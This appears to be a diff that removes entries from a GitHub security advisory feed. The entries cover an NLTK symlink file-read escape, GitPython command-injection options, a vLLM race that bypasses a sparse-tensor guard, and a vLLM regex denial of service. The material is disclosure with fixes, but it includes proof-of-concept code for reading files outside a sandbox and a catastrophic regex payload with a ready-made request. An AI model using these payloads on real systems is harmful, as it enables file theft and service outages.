-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-72r2-7mfr-5xr9">https://github.com/nltk/nltk/security/advisories/GHSA-72r2-7mfr-5xr9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-65915">https://nvd.nist.gov/vuln/detail/CVE-2026-65915</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3522">https://github.com/nltk/nltk/pull/3522</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/69db9911fdba914ceeaca7aec6e892d1b14586a9">https://github.com/nltk/nltk/commit/69db9911fdba914ceeaca7aec6e892d1b14586a9</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3731.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3731.yaml</a></li>
-<li><a href="https://huntr.com/bounties/a510de7b-ffaf-4a83-9bf8-fa7e63f4bd2d">https://huntr.com/bounties/a510de7b-ffaf-4a83-9bf8-fa7e63f4bd2d</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-arbitrary-file-read-via-filesystempathpointer">https://www.vulncheck.com/advisories/nltk-before-arbitrary-file-read-via-filesystempathpointer</a></li>
-<li><a href="https://github.com/advisories/GHSA-72r2-7mfr-5xr9">https://github.com/advisories/GHSA-72r2-7mfr-5xr9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-72r2-7mfr-5xr9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-08T15:27:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Symlink escape in CorpusReader allows arbitrary local file read outside the corpus root]]></title>
-        <id>https://github.com/advisories/GHSA-r6gq-whwq-mvg9</id>
-        <link href="https://github.com/advisories/GHSA-r6gq-whwq-mvg9"/>
-        <updated>2026-09-08T15:26:51.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>nltk.corpus.reader.api.CorpusReader.open()</code> can be used to read files outside the intended corpus root via a symlink placed inside that root. Although NLTK blocks absolute paths and <code>..</code> traversal, the current boundary check is only lexical and does not account for symlink resolution. This leads to an arbitrary local file read / filesystem sandbox bypass for applications that rely on <code>CorpusReader</code> or <code>FileSystemPathPointer</code> to restrict file access.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable flow is:</p>
-<ul>
-<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/corpus/reader/api.py#L222"><code>nltk/corpus/reader/api.py:222</code></a></p>
-<ul>
-<li><code>CorpusReader.open()</code> blocks absolute paths and <code>..</code>, then calls <code>self._root.join(file).open()</code></li>
-</ul>
-</li>
-<li><p><a href="/mnt/Data/my_brains/test/nltk/nltk/data.py#L398"><code>nltk/data.py:398</code></a></p>
-<ul>
-<li><code>FileSystemPathPointer.join()</code> joins the requested file ID and checks whether the resulting path still appears to remain under the configured root</li>
-</ul>
-</li>
-</ul>
-<p>The problem is that the check is based on the lexical path after <code>os.path.normpath()</code>, not on the resolved path after following symlinks.</p>
-<p>Current behavior:</p>
-<ol>
-<li><code>CorpusReader.open()</code> rejects:<ul>
-<li>absolute paths</li>
-<li><code>..</code> path traversal</li>
-</ul>
-</li>
-<li><code>FileSystemPathPointer.join()</code> computes:<ul>
-<li><code>joined = os.path.normpath(os.path.join(self._path, fileid))</code></li>
-<li><code>root = os.path.normpath(self._path)</code></li>
-</ul>
-</li>
-<li>It allows the access if <code>joined</code> starts with <code>root</code></li>
-</ol>
-<p>This misses the case where a path stays inside the root lexically, but resolves outside the root via a symlink already present under the allowed directory.</p>
-<p>Example:</p>
-<pre><code class="language-text">JOINED=/tmp/nltk-root/link/secret.txt
-REALPATH=/tmp/outside/secret.txt
-</code></pre>
-<p><code>JOINED</code> still appears to be inside the root, but <code>REALPATH</code> is outside it.</p>
-<p>This is distinct from simple <code>../</code> traversal:</p>
-<ul>
-<li>the file ID is not absolute</li>
-<li>the file ID does not contain <code>..</code></li>
-<li>the escape only happens after filesystem resolution of a symlink under the allowed root</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>Reproduced in an isolated Docker sandbox using the local <code>nltk</code> clone.</p>
-<p>Minimal Python PoC:</p>
-<pre><code class="language-python">import os
-import tempfile
-from nltk.corpus.reader.api import CorpusReader
-
-root = tempfile.mkdtemp(prefix="nltk-root-")
-outside_dir = tempfile.mkdtemp(prefix="nltk-out-")
-outside_file = os.path.join(outside_dir, "secret.txt")
-
-with open(outside_file, "w") as f:
-    f.write("secret-data")
-
-os.symlink(outside_dir, os.path.join(root, "link"))
-
-corpus = CorpusReader(root, ["link/secret.txt"])
-with corpus.open("link/secret.txt") as f:
-    print(f.read())
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">secret-data
-</code></pre>
-<p>Docker re-test output:</p>
-<pre><code class="language-text">ROOT=/tmp/nltk-root-jjxay3if
-OUTSIDE_DIR=/tmp/nltk-out-1kef36e0
-JOINED=/tmp/nltk-root-jjxay3if/link/secret.txt
-REALPATH=/tmp/nltk-out-1kef36e0/secret.txt
-READ_OK=secret-data
-INSIDE_ROOT=True
-REAL_INSIDE_ROOT=False
-</code></pre>
-<p>Additional impact validation using a system file:</p>
-<pre><code class="language-text">ROOT=/tmp/nltk-root-_h5x4m19
-JOINED=/tmp/nltk-root-_h5x4m19/hostfile
-REALPATH=/etc/hostname
-HOSTNAME_READ=48dafb244af3
-INSIDE_ROOT=True
-REAL_INSIDE_ROOT=False
-</code></pre>
-<p>This shows that the issue is not limited to attacker-created files outside the root; it can also read existing system files that are readable by the application user.</p>
-<h3 id="impact">Impact</h3>
-<p>This is an arbitrary local file read / symlink escape issue.</p>
-<p>Who is impacted:</p>
-<ul>
-<li>applications that accept attacker-controlled corpus directories, extracted datasets, or package contents</li>
-<li>applications that rely on NLTK corpus readers as a trust boundary for file access</li>
-<li>any deployment where an attacker can place or influence files inside the allowed corpus root</li>
-</ul>
-<p>Practical impact includes disclosure of:</p>
-<ul>
-<li>application secrets stored on disk</li>
-<li>local configuration files</li>
-<li>private datasets</li>
-<li>process-exposed files such as <code>/proc/self/environ</code></li>
-<li>system files readable by the running user</li>
-</ul>
-<p>The issue is best described as a filesystem sandbox bypass caused by improper link resolution before file access.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-r6gq-whwq-mvg9">https://github.com/nltk/nltk/security/advisories/GHSA-r6gq-whwq-mvg9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-70626">https://nvd.nist.gov/vuln/detail/CVE-2026-70626</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3522">https://github.com/nltk/nltk/pull/3522</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/1b0e519e2324bc1a273d56edee63e44d0ad85b48">https://github.com/nltk/nltk/commit/1b0e519e2324bc1a273d56edee63e44d0ad85b48</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/3.9.4">https://github.com/nltk/nltk/releases/tag/3.9.4</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3732.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3732.yaml</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-symlink-escape-via-corpusreader">https://www.vulncheck.com/advisories/nltk-before-symlink-escape-via-corpusreader</a></li>
-<li><a href="https://github.com/advisories/GHSA-r6gq-whwq-mvg9">https://github.com/advisories/GHSA-r6gq-whwq-mvg9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r6gq-whwq-mvg9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-08T15:26:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[gitpython] Duplicate Advisory: GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`]]></title>
-        <id>https://github.com/advisories/GHSA-4vpg-pfj8-m33q</id>
-        <link href="https://github.com/advisories/GHSA-4vpg-pfj8-m33q"/>
-        <updated>2026-09-08T15:08:45.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-956x-8gvw-wg5v. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>GitPython before 3.1.51 fails to guard against dangerous Git options passed as keyword arguments in Repo.archive() and git.ls_remote(), allowing command injection via options such as --exec/--upload-pack (leading to arbitrary command execution). Additionally, Repo.iter_commits() and Repo.blame() do not check for leading-dash revision arguments, so a revision like --output=</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-956x-8gvw-wg5v</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67323">https://nvd.nist.gov/vuln/detail/CVE-2026-67323</a></li>
-<li><a href="https://www.vulncheck.com/advisories/gitpython-before-command-injection-via-unguarded-git-options">https://www.vulncheck.com/advisories/gitpython-before-command-injection-via-unguarded-git-options</a></li>
-<li><a href="https://github.com/advisories/GHSA-4vpg-pfj8-m33q">https://github.com/advisories/GHSA-4vpg-pfj8-m33q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4vpg-pfj8-m33q</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-01T15:30:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[gitpython]  Duplicate Advisory: GitPython unsafe clone option gate bypass through joined short options]]></title>
-        <id>https://github.com/advisories/GHSA-cw2r-r7mw-j3hc</id>
-        <link href="https://github.com/advisories/GHSA-cw2r-r7mw-j3hc"/>
-        <updated>2026-09-08T15:08:26.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-v396-v7q4-x2qj. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>GitPython 3.1.50 fails to recognize joined short-option forms such as -u (the short form of --upload-pack=) when enforcing its default unsafe-option gate. When an application passes attacker-influenced clone options into Repo.clone_from(..., multi_options=..., allow_unsafe_options=False), an attacker can supply -u to bypass the gate that blocks --upload-pack/-u, causing Git to execute the specified helper command during clone. Fixed in 3.1.51.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v396-v7q4-x2qj">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v396-v7q4-x2qj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67324">https://nvd.nist.gov/vuln/detail/CVE-2026-67324</a></li>
-<li><a href="https://www.vulncheck.com/advisories/gitpython-authentication-bypass-via-joined-short-options">https://www.vulncheck.com/advisories/gitpython-authentication-bypass-via-joined-short-options</a></li>
-<li><a href="https://github.com/advisories/GHSA-cw2r-r7mw-j3hc">https://github.com/advisories/GHSA-cw2r-r7mw-j3hc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cw2r-r7mw-j3hc</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-08-01T15:30:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vllm]  vLLM: Incomplete CVE-2025-62164 remediation can be bypassed by concurrent prompt parts]]></title>
-        <id>https://github.com/advisories/GHSA-pr7f-p5mw-fc87</id>
-        <link href="https://github.com/advisories/GHSA-pr7f-p5mw-fc87"/>
-        <updated>2026-09-04T21:39:05.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
-<p>The follow-up protection for CVE-2025-62164 is incomplete at vLLM revision <code>26587f9519e22a5c4549ead7595ad9ca3229c4fd</code>. It wraps serialized prompt-embedding reconstruction and dense conversion in <code>torch.sparse.check_sparse_tensor_invariants()</code>, but PyTorch 2.11.0 implements that context with save/enable/restore operations over process-global state. Two prompt-embedding parts in one <code>/v1/chat/completions</code> request are gathered concurrently on the event loop's default executor. When one context exits before the other loads its tensor, it can restore the global flag to <code>False</code> while the second part remains inside its guard.</p>
-<p>In a deterministic run against hash-verified source from the affected revision, the actual target loader rejected an invalid sparse payload as a negative control. The frozen chat tracker then scheduled benign and malicious parts on distinct <code>asyncio_0</code> and <code>asyncio_1</code> threads. The benign context exited, the malicious loader observed the invariant flag disabled, and <code>torch.load(weights_only=True)</code> reconstructed indices <code>[[10], [10]]</code> for a declared shape of <code>[3, 3]</code>. The run intercepted the target's <code>to_dense()</code> call before it operated on the invalid tensor.</p>
-<p>This primary trigger requires <code>--enable-prompt-embeds</code>, which is default-off, but it does <strong>not</strong> require <code>renderer_num_workers &gt; 1</code>, a multimodal model, or <code>--enable-mm-embeds</code>. API authentication is optional in the stock server: middleware is installed only when CLI or environment API keys are supplied.</p>
-<p>The lab proves bypass of the follow-up guard, invalid sparse reconstruction, and guarded-sink reachability. Crash and memory-corruption consequences are conditional on the behavior documented by the published CVE.</p>
-<h2 id="background">Background</h2>
-<p>CVE-2025-62164 / <a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-mrw7-hf4f-83pf">GHSA-mrw7-hf4f-83pf</a> concerns client-controlled serialized <code>prompt_embeds</code> reaching <code>torch.load(weights_only=True)</code> and an invalid sparse tensor reaching <code>to_dense()</code>. The advisory attributes memory corruption, denial of service, and potential code execution to that historical unsafe operation.</p>
-<p>The remediation chronology matters for duplicate handling:</p>
-<ul>
-<li>PR <a href="https://github.com/vllm-project/vllm/pull/27204">#27204</a>, merge commit <a href="https://github.com/vllm-project/vllm/commit/58fab50d82838d5014f4a14d991fdb9352c9c84b"><code>58fab50d82838d5014f4a14d991fdb9352c9c84b</code></a> on 2025-10-22, introduced the default-off <code>enable_prompt_embeds</code> gate. It did not add the sparse-invariant context.</li>
-<li>Commit <a href="https://github.com/vllm-project/vllm/commit/84e23d103d3483f944780d0d42bcf0993fd27e3a"><code>84e23d103d3483f944780d0d42bcf0993fd27e3a</code></a> on 2025-12-15, titled <code>additional protection for CVE-2025-62164 (#30649)</code>, added the process-global sparse-invariant context around load, type check, and dense conversion.</li>
-<li>Refactor commit <a href="https://github.com/vllm-project/vllm/commit/f0a1c8453ad1c664c8a04c83fe545195fcd556eb"><code>f0a1c8453ad1c664c8a04c83fe545195fcd556eb</code></a> on 2026-01-31 moved the guarded loader into <code>vllm/renderers/embed_utils.py</code> while preserving the same context.</li>
-<li>Chat content-part commit <a href="https://github.com/vllm-project/vllm/commit/14043dfecd35dd2f12b4d51eb9fa166184a0ca0f"><code>14043dfecd35dd2f12b4d51eb9fa166184a0ca0f</code></a> on 2026-05-01 introduced <code>prompt_embeds</code> chat parts and the concurrent one-request schedule described here.</li>
-</ul>
-<p>This report therefore does not present the malformed sparse payload or <code>to_dense()</code> sink as new. It reports a distinct concurrency root cause and trigger: unsynchronized save/enable/restore of the process-global follow-up guard, reachable through the later multi-part chat scheduler.</p>
-<p>The affected revision pins PyTorch 2.11.0 in <code>pyproject.toml:10</code>.</p>
-<h2 id="vulnerability-details">Vulnerability Details</h2>
-<p>The target's <code>safe_load_prompt_embeds</code> performs the guarded operation in <code>vllm/renderers/embed_utils.py:16-39</code>:</p>
-<pre><code class="language-python">with torch.sparse.check_sparse_tensor_invariants():
-    tensor = torch.load(
-        BytesIO(pybase64.b64decode(embed, validate=True)),
-        weights_only=True,
-        map_location=torch.device("cpu"),
-    )
-    if not isinstance(tensor, torch.Tensor):
-        raise VLLMValidationError(...)
-    tensor = tensor.to_dense()
-</code></pre>
-<p>The context is not request-local. With the global flag initially disabled, we can describe the verified interleaving:</p>
-<ol>
-<li>Benign part A enters, saves <code>False</code>, and enables the flag.</li>
-<li>Malicious part B enters, saves <code>True</code>, and leaves the flag enabled.</li>
-<li>A completes its load and exits, restoring its saved <code>False</code> value.</li>
-<li>B remains lexically inside its context but observes the actual global flag as <code>False</code>.</li>
-<li>B's <code>torch.load(..., weights_only=True)</code> reconstructs the malformed sparse tensor.</li>
-<li>The target reaches <code>tensor.to_dense()</code> before later rank, hidden-size, and dtype checks.</li>
-</ol>
-<p><code>weights_only=True</code> constrains deserialization types; it does not compensate for a sparse invariant check that another request has disabled.</p>
-<p>The complete stock actor-to-sink chain, traced in the affected source, is:</p>
-<p><code>POST /v1/chat/completions</code> (<code>vllm/entrypoints/openai/chat_completion/api_router.py:41-61</code>) -&gt; <code>OpenAIServingChat.create_chat_completion</code> -&gt; <code>_create_chat_completion</code> -&gt; <code>render_chat_request</code> (<code>vllm/entrypoints/openai/chat_completion/serving.py:206-280</code>) -&gt; <code>OnlineRenderer.render_chat</code> (<code>vllm/renderers/online_renderer.py:95-190</code>) -&gt; <code>preprocess_chat</code> (<code>vllm/renderers/online_renderer.py:335-380</code>) -&gt; <code>BaseRenderer.render_chat_async</code> (<code>vllm/renderers/base.py:1070-1105</code>) -&gt; <code>HfRenderer.render_messages_async</code> (<code>vllm/renderers/hf.py:1049-1085</code>) -&gt; <code>parse_chat_messages_async</code> (<code>vllm/entrypoints/chat_utils.py:1911-1945</code>) -&gt; content-part <code>parse_prompt_embeds</code> and <code>_load_prompt_embeds_async</code> (<code>vllm/entrypoints/chat_utils.py:1099-1120</code>) -&gt; <code>AsyncMultiModalItemTracker.resolve_items</code> (<code>vllm/entrypoints/chat_utils.py:818-835</code>) -&gt; <code>asyncio.gather</code> of both prompt parts -&gt; <code>safe_load_prompt_embeds_async</code> -&gt; <code>make_async</code> -&gt; <code>loop.run_in_executor(executor=None, ...)</code> (<code>vllm/utils/async_utils.py:28-45</code>) -&gt; guarded <code>torch.load</code> -&gt; <code>to_dense()</code>.</p>
-<p>The prompt async helper is created without an explicit executor, so it uses the event loop's default executor. This path is separate from the renderer's configurable pool. The deterministic scheduler run observed the two parts on distinct default-executor threads while leaving <code>renderer_num_workers</code> at its default of one.</p>
-<p><code>prompt_embeds</code> bypasses multimodal processing, and the tracker explicitly permits it when <code>is_multimodal_model=False</code> (<code>vllm/entrypoints/chat_utils.py:793-837</code>). Consequently, the primary trigger needs neither a multimodal model nor <code>enable_mm_embeds</code>.</p>
-<p>The source also states that async wrappers must be thread-safe (<code>vllm/utils/async_utils.py:28-38</code>), while a target test acknowledges that the sparse flag is not thread-local and concurrent users can leak state (<code>tests/renderers/test_sparse_tensor_validation.py:58-61</code>).</p>
-<h2 id="exploitability-analysis">Exploitability Analysis</h2>
-<p>The following evidence labels separate what was demonstrated from what remains conditional:</p>
-<table>
-<thead>
-<tr>
-<th>Label</th>
-<th>Claim</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Verified by run</strong></td>
-<td>PyTorch 2.11.0 rejects the identical invalid payload through the actual target loader without the race.</td>
-</tr>
-<tr>
-<td><strong>Verified by run</strong></td>
-<td>The hash-verified frozen tracker schedules two prompt parts on distinct default-executor threads, races the flag to <code>False</code>, reconstructs the invalid sparse tensor, and reaches the target <code>to_dense()</code> call while the interception prevents execution.</td>
-</tr>
-<tr>
-<td><strong>Traced in source</strong></td>
-<td>A client can supply multiple <code>prompt_embeds</code> content parts through the stock <code>/v1/chat/completions</code> route and the function chain above.</td>
-</tr>
-<tr>
-<td><strong>Traced in source</strong></td>
-<td><code>enable_prompt_embeds</code> defaults to <code>False</code> (<code>vllm/config/model.py:255-260</code>), so the operator must opt in. <code>enable_mm_embeds</code> and non-default renderer workers are not preconditions for this path.</td>
-</tr>
-<tr>
-<td><strong>Traced in source</strong></td>
-<td><code>api_key</code> defaults to <code>None</code> (<code>vllm/entrypoints/openai/cli_args.py:264</code>), and authentication middleware is installed only when a CLI or environment key is present (<code>vllm/entrypoints/openai/api_server.py:306-310</code>). With a configured key, the attacker must authenticate; without one, the stock route has no API-key middleware.</td>
-</tr>
-<tr>
-<td><strong>Unrun</strong></td>
-<td>A live HTTP/GPU server, real-world race win rate, unsafe dense conversion, process crash, memory corruption, and reliable code execution.</td>
-</tr>
-</tbody></table>
-<p>The feature is documented for trusted users, which narrows intended exposure. It is not a memory-safety boundary: a user authorized to submit embedding inputs should not be able to disable a process-wide invariant for concurrent work.</p>
-<p>The current run proves the same invalid sparse object can cross the guard and reach the historical sink. If executing that sink retains the behavior described in CVE-2025-62164 for the deployed PyTorch build, denial of service or memory corruption may follow. This is a conditional impact statement, not a reproduced outcome. Reliable RCE is not claimed.</p>
-<p>The opt-in feature, scheduling requirement, and absence of a measured live win rate support <strong>Medium/P2</strong> despite the serious historical sink class. No additional deployment assumptions are required for the one-request scheduler beyond stock default-executor concurrency being available.</p>
-<h2 id="remediation">Remediation</h2>
-<p>The immediate fix is one shared process-wide lock around every use of this process-global sparse guard. The lock must cover invariant enabling, deserialization, tensor type validation, and dense conversion:</p>
-<pre><code class="language-python">with shared_sparse_load_lock:
-    with torch.sparse.check_sparse_tensor_invariants():
-        tensor = torch.load(..., weights_only=True, map_location="cpu")
-        validate_tensor_type(tensor)
-        tensor = tensor.to_dense()
-</code></pre>
-<p>Every prompt, image, and audio loader that manipulates the same global flag must use the same lock. A lock only around <code>torch.load</code>, separate per-loader locks, or a lock omitted from the chat helper would leave overlapping save/restore sequences possible.</p>
-<p>The stronger design is to avoid mutable process-global validation state in concurrent request code. Prefer a PyTorch per-call invariant check if one is available, or reconstruct and validate serialized embeddings inside a deliberately serialized boundary before any sparse operation.</p>
-<p>Regression coverage should:</p>
-<ul>
-<li>Preserve the actual-target negative control using the identical malformed payload.</li>
-<li>Force A-enter, B-enter, A-exit, B-load and assert B remains protected.</li>
-<li>Execute the multi-part chat tracker with the event loop's default executor and <code>renderer_num_workers=1</code>.</li>
-<li>Cover cross-loader overlap so later prompt, image, or audio changes cannot bypass a shared fix.</li>
-<li>Assert the global flag is restored after success and exceptions.</li>
-<li>Reject invalid tensors before any dense conversion.</li>
-</ul>
-<p>Until a fix is deployed, leaving <code>enable_prompt_embeds</code> disabled removes this stock source path.</p>
-<h2 id="summary">Summary</h2>
-<p>The affected vLLM revision uses a process-global PyTorch context as the follow-up protection for CVE-2025-62164. A later chat feature causes two prompt-embedding parts from one request to run concurrently on the default executor. One context can restore the flag to <code>False</code> while the other is still guarded, allowing the historical malformed sparse payload class to reach the historical <code>to_dense()</code> sink. The new issue is the concurrent guard bypass and shipped trigger, not the payload or sink. Runtime validation proves the bypass and safe sink reachability on PyTorch 2.11.0; historical crash and memory-corruption effects remain conditional, and RCE was not tested or claimed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-pr7f-p5mw-fc87">https://github.com/vllm-project/vllm/security/advisories/GHSA-pr7f-p5mw-fc87</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73557">https://nvd.nist.gov/vuln/detail/CVE-2026-73557</a></li>
-<li><a href="https://github.com/vllm-project/vllm/pull/48583">https://github.com/vllm-project/vllm/pull/48583</a></li>
-<li><a href="https://github.com/vllm-project/vllm/commit/793cf79c89d4049124e756915468ac30318f2e50">https://github.com/vllm-project/vllm/commit/793cf79c89d4049124e756915468ac30318f2e50</a></li>
-<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-pr7f-p5mw-fc87">https://github.com/advisories/GHSA-pr7f-p5mw-fc87</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pr7f-p5mw-fc87</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-04T21:39:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vllm] vLLM: ReDoS via structured_outputs.regex in the lm-format-enforcer backend (no compile timeout) — missed sibling of GHSA-rwxx-mrjm-wc2m]]></title>
-        <id>https://github.com/advisories/GHSA-48jh-3gj7-fg8v</id>
-        <link href="https://github.com/advisories/GHSA-48jh-3gj7-fg8v"/>
-        <updated>2026-09-04T21:37:01.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The fix for <code>GHSA-rwxx-mrjm-wc2m</code> ("ReDoS via <code>structured_outputs.regex</code> compiled without timeout") wrapped the regex compile in the <strong>xgrammar</strong> and <strong>outlines</strong> backends with <code>compile_regex_with_timeout</code> (and, for outlines, <code>validate_regex_is_buildable</code>). The <strong>lm-format-enforcer</strong> backend was left unguarded: it compiles the attacker-supplied regex with no timeout and no buildability check. A single request with a catastrophic regex hangs the structured-output compile step and stalls the engine worker (denial of service).</p>
-<h3 id="affected-code-head-d6d39c1">Affected code (HEAD d6d39c1)</h3>
-<p><code>vllm/v1/structured_output/backend_lm_format_enforcer.py</code>:</p>
-<ul>
-<li>line 110: <code>character_level_parser = lmformatenforcer.RegexParser(grammar_spec)</code> — builds an <code>interegular</code> FSM from the attacker regex synchronously, <strong>no timeout</strong>.</li>
-<li>line 155: <code>validate_structured_output_request_lm_format_enforcer</code> returns immediately on <code>if so_params.regex:</code> — <strong>no validation</strong>.</li>
-</ul>
-<p>Sibling backends that WERE patched by GHSA-rwxx:</p>
-<ul>
-<li><code>backend_xgrammar.py:92</code> → <code>compile_regex_with_timeout(...)</code>.</li>
-<li><code>backend_outlines.py:65</code> → <code>compile_regex_with_timeout(...)</code> (plus <code>validate_regex_is_buildable</code>).</li>
-</ul>
-<p>lm-format-enforcer uses the same <code>interegular</code> DFA-construction primitive the advisory cites for the outlines backend.</p>
-<h3 id="reproduction-runtime-verified-against-the-sink">Reproduction (runtime-verified against the sink)</h3>
-<p>The sink <code>lmformatenforcer.RegexParser(&lt;regex&gt;)</code> was exercised directly (this is exactly what the backend calls):</p>
-<pre><code>baseline  '[0-9]{3}'          -&gt; 0.0002 s
-attacker  '(a{1,300}){300}'   -&gt; DID NOT COMPLETE in 20 s (one core pegged at 100% in interegular FSM construction)
-</code></pre>
-<p>End-to-end: start <code>vllm serve &lt;model&gt; --structured-outputs-config '{"backend":"lm-format-enforcer"}'</code>, then <code>POST /v1/completions</code> with <code>{"structured_outputs":{"regex":"(a{1,300}){300}"}, ...}</code>. The request never returns; because grammar compile runs in the engine's structured-output path, concurrent requests stall = worker-level DoS. The identical request against the outlines backend is bounded by <code>compile_regex_with_timeout</code> and returns a clean error.</p>
-<h3 id="impact">Impact</h3>
-<p>Unauthenticated denial of service (vLLM ships with no authentication by default). One request pegs a CPU core and blocks the structured-output engine path.</p>
-<p><strong>Reachability precondition:</strong> the operator must have selected <code>backend=lm-format-enforcer</code> via <code>--structured-outputs-config</code> (the default is <code>auto</code> → xgrammar). This is the same opt-in tier as the outlines backend that GHSA-rwxx already covered.</p>
-<h3 id="suggested-remediation">Suggested remediation</h3>
-<p>Route the lm-format-enforcer regex compile (<code>backend_lm_format_enforcer.py:110</code>) through the same <code>compile_regex_with_timeout</code> guard already applied to the xgrammar and outlines backends, and reject un-buildable / oversized patterns in <code>validate_structured_output_request_lm_format_enforcer</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-48jh-3gj7-fg8v">https://github.com/vllm-project/vllm/security/advisories/GHSA-48jh-3gj7-fg8v</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73556">https://nvd.nist.gov/vuln/detail/CVE-2026-73556</a></li>
-<li><a href="https://github.com/vllm-project/vllm/pull/47595">https://github.com/vllm-project/vllm/pull/47595</a></li>
-<li><a href="https://github.com/vllm-project/vllm/commit/c9a788eedc412acceaa5112e0d44624b49841577">https://github.com/vllm-project/vllm/commit/c9a788eedc412acceaa5112e0d44624b49841577</a></li>
-<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-48jh-3gj7-fg8v">https://github.com/advisories/GHSA-48jh-3gj7-fg8v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-48jh-3gj7-fg8v</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-04T21:37:00.000Z</published>
     </entry>
 </feed>
